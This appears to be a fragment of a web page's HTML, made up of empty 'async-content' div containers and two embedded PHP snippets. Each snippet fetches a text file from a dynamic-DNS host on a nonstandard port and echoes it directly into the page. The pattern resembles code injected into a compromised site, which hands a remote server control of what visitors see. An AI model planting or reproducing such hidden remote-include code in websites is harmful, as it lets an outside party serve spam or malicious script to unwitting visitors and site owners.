...
<div id="async-content-d" class="async-content bsd">
<p>
...
<div id="async-content-f" class="async-content bsd">
<p>
...
<div id="async-content-h" class="async-content bsd">
<p>
...
<div id="async-content-i" class="async-content bsd">
...
<div id="async-content-j" class="async-content bsd">
...
<div id="async-content-o" class="async-content bsd">
...
<div id="async-content-v " class="async-content bsd">
...
<div id="async-content-x " class="async-content bsd">
...
<div id="async-content-s " class="async-content bsd">
...
<?php
$s = file_get_contents('http://sufbo.tplinkdns.com:8004/a.txt'); echo $s;
?>
</div>
...
<?php
$s = file_get_contents('http://sufbo.tplinkdns.com:8007/a.txt'); echo $s;
?>
</div>
